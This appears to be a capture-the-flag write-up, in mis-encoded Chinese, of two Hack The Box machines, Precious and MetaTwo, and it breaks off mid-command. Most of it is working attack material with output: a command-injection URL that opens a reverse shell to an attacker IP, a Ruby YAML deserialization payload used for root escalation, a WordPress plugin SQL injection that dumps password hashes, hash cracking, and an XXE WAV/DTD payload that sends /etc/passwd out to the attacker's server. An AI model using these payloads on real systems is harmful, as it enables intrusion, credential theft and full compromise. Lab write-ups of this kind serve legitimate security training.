v0.8.6,googleä¸€ä¸‹\n\nå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´\nå‘½ä»¤æ³¨å…¥https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795\nç®€å•è¯´åœ¨urlåè·Ÿä»»æ„å‚æ•°ï¼Œå€¼ä¸ºæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤å³å¯\n\n\næˆåŠŸå›æ˜¾\nåå¼¹shellæœ¬åœ°å¼€å¯ncç›‘å¬\nâ””â”€# nc -lvvp 9999            \nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::9999\nNcat: Listening on 0.0.0.0:9999\n\nç½‘é¡µè¾“å…¥\nhttp://10.10.16.8/?n=%20`python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.8&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;`\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# nc -lvvp 9999            \nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::9999\nNcat: Listening on 0.0.0.0:9999\nNcat: Connection from 10.10.11.189.\nNcat: Connection from 10.10.11.189:39340.\n$ ls\nls\napp  config  config.ru  Gemfile  Gemfile.lock  pdf  public\n$ cd ..\ncd ..\n$ ls\nls\nhtml  pdfapp\n$ cd ..\ncd ..\n$ ls\nls\nbackups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www\n$ cd ..\ncd ..\n$ ls\nls\nbin   home            lib64       mnt   run   tmp      vmlinuz.old\nboot  initrd.img      libx32      opt   sbin  usr\ndev   initrd.img.old  lost+found  proc  srv   var\netc   lib             media       root  sys   vmlinuz\n$ cd home\ncd home\n$ ls\nls\nhenry  ruby\n$ cd ruby\ncd ruby\n$ ls -a\nls -a\n.   .bash_history  .bashrc  .cache  .local    .ssh\n..  .bash_logout   .bundle  .gnupg  .profile\n$ cd .bundle    \ncd .bundle\n$ ls\nls\nconfig\n$ cat config \ncat config\n---\nBUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;\n\nåœ¨&#x2F;home&#x2F;ruby&#x2F;.bundle&#x2F;configæ–‡ä»¶ä¸‹ï¼Œå¾—åˆ°henryç”¨æˆ·å¯†ç Q3c1AqGHtoI0aXAYFH\nsshè¿æ¥â”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# ssh henry@10.10.11.189  \nhenry@10.10.11.189&#39;s password: \nLinux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Feb 11 06:13:55 2023 from 10.10.14.128\nhenry@precious:~$ whoami\nhenry\nhenry@precious:~$ cd~\n-bash: cd~: command not found\nhenry@precious:~$ cd ~\nhenry@precious:~$ ls\nuser.txt\nhenry@precious:~$ cat user.txt\n6e78f78d96b06b9c3fb505a76dc833e7\nhenry@precious:~$ \n\nå¾—åˆ°user flag\nææƒsudo -læŸ¥çœ‹å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œçš„æ–‡ä»¶\nhenry@precious:~$ sudo -l\nMatching Defaults entries for henry on precious:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser henry may run the following commands on precious:\n    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb\n\næŸ¥çœ‹è„šæœ¬æ–‡ä»¶\nhenry@precious:~$ cat /opt/update_dependencies.rb\n# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;\nrequire &quot;yaml&quot;\nrequire &#39;rubygems&#39;\n\n# TODO: update versions automatically\ndef update_gems()\nend\n\ndef list_from_file\n    YAML.load(File.read(&quot;dependencies.yml&quot;))\nend\n\ndef list_local_gems\n    Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;\nend\n\ngems_file = list_from_file\ngems_local = list_local_gems\n\ngems_file.each do |file_name, file_version|\n    gems_local.each do |local_name, local_version|\n        if(file_name == local_name)\n            if(file_version != local_version)\n                puts &quot;Installed version differs from the one specified in file: &quot; + local_name\n            else\n                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name\n            end\n        end\n    end\nend\n\nå¯ä»¥çœ‹åˆ°è„šæœ¬æ‰§è¡Œæ—¶ä¼šåŠ è½½ä¸€ä¸ªåä¸ºdependencies.ymlçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨æ­¤æ–‡ä»¶ä¸­å†™å…¥æ¶æ„ä»£ç ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œæ­¤è„šæœ¬æ—¶ï¼Œä¼šä»¥rootæƒé™æ‰§è¡Œï¼Œè°ƒç”¨dependencies.ymlæ–‡ä»¶ï¼Œé‚£ä¹ˆæ–‡ä»¶ä¸­çš„ä»£ç ä¹Ÿä¼šæ˜¯rootæƒé™æ‰§è¡Œçš„ã€‚\né€šè¿‡ YAML ååºåˆ—åŒ–çš„è¿œç¨‹ä»£ç æ‰§è¡Œhttps://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/\nhttps://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md\nhttps://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml\nåœ¨&#x2F;home&#x2F;henryç›®å½•ä¸‹æ–°å»ºdependencies.ymlæ–‡ä»¶ï¼Œåœ¨&#x2F;optç›®å½•æ˜¯ä¸å…è®¸ä¿®æ”¹æ–‡ä»¶çš„\nhenry@precious:~$ vi dependencies.yml\nhenry@precious:~$ cat dependencies.yml\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &amp;1 !ruby/object:Net::BufferedIO\n      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: &quot;abc&quot;\n      debug_output: &amp;1 !ruby/object:Net::WriteAdapter\n         socket: &amp;1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module &#39;Kernel&#39;\n                 method_id: :system\n             git_set: &quot;chmod +s /bin/bash&quot;\n         method_id: :resolve\n\ngit_set:è¿™é‡Œå†™å‘½ä»¤\næ‰§è¡Œè„šæœ¬\nhenry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb\nsh: 1: reading: not found\nTraceback (most recent call last):\n        33: from /opt/update_dependencies.rb:17:in `&lt;main&gt;&#39;\n        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;\n        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load&#39;\n        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39;\n        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;\n        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;\n        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;\n        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&#39;\n        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;\n        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;\n        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;\n        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&#39;\n        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty&#39;\n        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&#39;\n        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty&#39;\n        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;\n        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;\n        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;\n        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping&#39;\n        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&#39;\n        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with&#39;\n        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&#39;\n        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize&#39;\n        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&#39;\n         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each&#39;\n         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&#39;\n         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read&#39;\n         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&#39;\n         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;\n         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;\n         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve&#39;\n         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;\n         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;\n/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&#39;: no implicit conversion of nil into String (TypeError)\nhenry@precious:~$ ls -al\ntotal 32\ndrwxr-xr-x 3 henry henry 4096 Feb 11 07:47 .\ndrwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..\nlrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 henry henry  220 Sep 26 04:40 .bash_logout\n-rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc\n-rw-r--r-- 1 henry henry  619 Feb 11 07:47 dependencies.yml\ndrwxr-xr-x 3 henry henry 4096 Feb 11 06:30 .local\n-rw-r--r-- 1 henry henry  807 Sep 26 04:40 .profile\n-rw-r----- 1 root  henry   33 Feb 11 05:10 user.txt\nhenry@precious:~$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash\nhenry@precious:~$ /bin/bash -p\nbash-5.1# whoami\nroot\nbash-5.1# cd /root\nbash-5.1# ls\nroot.txt\nbash-5.1# cat root.txt\n20365dcbcc3d536222b0cbcdb5972c5a\n\næ‹¿åˆ°root flag\nMetaTwonmapæ‰«æâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# nmap -sC -sV 10.10.11.186\nStarting Nmap 7.91 ( https://nmap.org ) at 2023-02-11 05:08 EST\nStats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\nNSE Timing: About 98.30% done; ETC: 05:09 (0:00:00 remaining)\nNmap scan report for metapress.htb (10.10.11.186)\nHost is up (1.5s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp\n| fingerprint-strings: \n|   GenericLines: \n|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]\n|     Invalid command: try being more creative\n|_    Invalid command: try being more creative\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)\n|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)\n|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)\n80/tcp open  http    nginx 1.18.0\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-generator: WordPress 5.6.2\n| http-robots.txt: 1 disallowed entry \n|_/wp-admin/\n|_http-server-header: nginx/1.18.0\n|_http-title: MetaPress &amp;#8211; Official company site\n|_http-trane-info: Problem with XML parsing of /evox/about\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port21-TCP:V=7.91%I=7%D=2/11%Time=63E76940%P=x86_64-pc-linux-gnu%r(Gene\nSF:ricLines,8F,&quot;220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10\\\nSF:.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20cre\nSF:ative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creative\nSF:\\r\\n&quot;);\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 95.15 second\n\nå¼€æ”¾äº†80&#x2F;22&#x2F;21ç«¯å£\nåœ¨&#x2F;etc&#x2F;hostsä¸­æ·»åŠ metapress.htb\nwebæ¼æ´å‘ç°æŸ¥çœ‹ç½‘é¡µï¼Œé€šè¿‡wappalyzerçœ‹åˆ°ä½¿ç”¨äº†WordPress5.6.2æ­å»º\n\næ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨wpscanæ¥æ‰«æå¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼Œå¯èƒ½ç”±äºæˆ‘çš„wpscanç‰ˆæœ¬è¿‡ä½å¹¶æ²¡æœ‰æ‰«å‡ºæ¥\næ‰‹å·¥æŸ¥æ‰¾æ¼æ´ï¼ŒF12æŸ¥çœ‹ï¼Œç”¨åˆ°äº†ä¸€ä¸ªåä¸ºbookingpressçš„æ’ä»¶ï¼Œç‰ˆæœ¬ä¸º1.0.10\n\nSQLæ³¨å…¥æ¼æ´Googleä¸€ä¸‹ï¼Œå­˜åœ¨ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´\nhttps://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357\næ ¹æ®é“¾æ¥ï¼Œæˆ‘ä»¬éœ€è¦å¾—åˆ°**_wpnonce**çš„å€¼ï¼ŒF12æŸ¥æ‰¾\n\nå¾—åˆ°å€¼ä¸ºb67ccae67b\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=b67ccae67b&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39;\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Sat, 11 Feb 2023 10:21:47 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: PHP/8.0.24\nX-Robots-Tag: noindex\nX-Content-Type-Options: nosniff\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\nCache-Control: no-cache, must-revalidate, max-age=0\nX-Frame-Options: SAMEORIGIN\nReferrer-Policy: strict-origin-when-cross-origin\n\n[&#123;&quot;bookingpress_service_id&quot;:&quot;10.5.15-MariaDB-0+deb11u1&quot;,&quot;bookingpress_category_id&quot;:&quot;Debian 11&quot;,&quot;bookingpress_service_name&quot;:&quot;debian-linux-gnu&quot;,&quot;bookingpress_service_price&quot;:&quot;$1.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;2&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;3&quot;,&quot;bookingpress_service_description&quot;:&quot;4&quot;,&quot;bookingpress_service_position&quot;:&quot;5&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;6&quot;,&quot;service_price_without_currency&quot;:1,&quot;img_url&quot;:&quot;http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg&quot;&#125;]    \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=b67ccae67b&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -&#39;\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Sat, 11 Feb 2023 10:22:50 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: PHP/8.0.24\nX-Robots-Tag: noindex\nX-Content-Type-Options: nosniff\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\nCache-Control: no-cache, must-revalidate, max-age=0\nX-Frame-Options: SAMEORIGIN\nReferrer-Policy: strict-origin-when-cross-origin\n\n[&#123;&quot;bookingpress_service_id&quot;:&quot;admin,manager&quot;,&quot;bookingpress_category_id&quot;:&quot;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70&quot;,&quot;bookingpress_service_name&quot;:&quot;debian-linux-gnu&quot;,&quot;bookingpress_service_price&quot;:&quot;$1.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;2&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;3&quot;,&quot;bookingpress_service_description&quot;:&quot;4&quot;,&quot;bookingpress_service_position&quot;:&quot;5&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;6&quot;,&quot;service_price_without_currency&quot;:1,&quot;img_url&quot;:&quot;http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg&quot;&#125;]content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg&quot;&#125;] \n\nå¾—åˆ°admin,managerï¼š$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70\njohnçˆ†ç ´â”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# cat metapress                                                                                                                                                                                        130 â¨¯\nadmin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.\nmanager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70\n                   \nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# john -w=/usr/share/wordlists/rockyou.txt metapress \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])\nRemaining 1 password hash\nCost 1 (iteration count) is 8192 for all loaded hashes\nWill run 8 OpenMP threads\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:05 0.41% (ETA: 05:44:45) 0g/s 13894p/s 13894c/s 13894C/s steve11..nick20\n0g 0:00:01:14 6.41% (ETA: 05:43:33) 0g/s 14077p/s 14077c/s 14077C/s SHAZZA..SASHA11\n0g 0:00:01:18 6.80% (ETA: 05:43:25) 0g/s 14095p/s 14095c/s 14095C/s 17070..16571657\nSession aborted\n                                                                                                                                                                                                               \nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# john --show metapress                                                                                                                                                                                  1 â¨¯\nmanager:partylikearockstar\n\n1 password hash cracked, 1 left\n\nç”¨å¾—åˆ°çš„ç”¨æˆ·åå¯†ç ç™»å½•ç½‘ç«™åå°\nå‘ç°é™¤äº†èƒ½ä¸Šä¼ mediaï¼Œå°±æ²¡ä»€ä¹ˆèƒ½åšçš„äº†\n\nä¹‹å‰æˆ‘ä»¬å¾—åˆ°WordPressç‰ˆæœ¬ä¸º5.6.2ï¼ŒGoogleä¸€ä¸‹\nhttps://github.com/motikan2010/CVE-2021-29447\nhttps://tryhackme.com/room/wordpresscve202129447\nå­˜åœ¨XXEæ¼æ´\nXXEæ¼æ´-CVE-2021-29447æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª WAV æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†è·å–å¦ä¸€ä¸ªåä¸º dedsec.dtd çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬çš„æ¶æ„å†…å®¹\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# echo -en &#39;RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://10.10.16.8:9999/dedsec.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\\x00&#39; &gt; payload.wav         \n\nåˆ›å»º dedsec.dtd æ–‡ä»¶ï¼Œå®ƒå°†è¯»å– /etc/passwd æ–‡ä»¶å¹¶å°†å…¶è½¬æ¢ä¸º base64 å¹¶åœ¨æˆ‘ä»¬çš„ php æœåŠ¡å™¨ä¸Šå‘é€ GET è¯·æ±‚ä¸­çš„æ•°æ®\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# cat dedsec.dtd                                                                                                                                                                                          \n&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;\n&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.16.8:9999/?p=%file;&#39;&gt;&quot; &gt;\n\nå¯åŠ¨ PHP æœåŠ¡å™¨\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# php -S 0.0.0.0:9999\n[Sat Feb 11 04:05:17 2023] PHP 7.4.21 Development Server (http://0.0.0.0:9999) started\n\nåœ¨ç½‘é¡µç«¯ä¸Šä¼ payload.wav,æ”¶åˆ°å›æ˜¾\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# php -S 0.0.0.0:9999\n[Sat Feb 11 04:05:17 2023] PHP 7.4.21 Development Server (http://0.0.0.0:9999) started\n[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 Accepted\n[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 [200]: (null) /dedsec.dtd\n[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 Closing\n[Sat Feb 11 04:06:00 2023] 10.10.11.186:39782 Accepted\n[Sat Feb 11 04:06:01 2023] 10.10.11.186:39782 [200]: GET 0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=                                      \n[Sat Feb 11 04:06:01 2023] 10.10.11.186:39782 Closing\n[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 Accepted\n[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 [200]: GET /dedsec.dtd\n[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 Closing\n[Sat Feb 11 04:06:04 2023] 10.10.11.186:39800 Accepted\n[Sat Feb 11 04:06:05 2023] 10.10.11.186:39800 [200]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=\n\nbase64è§£ç \nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# echo 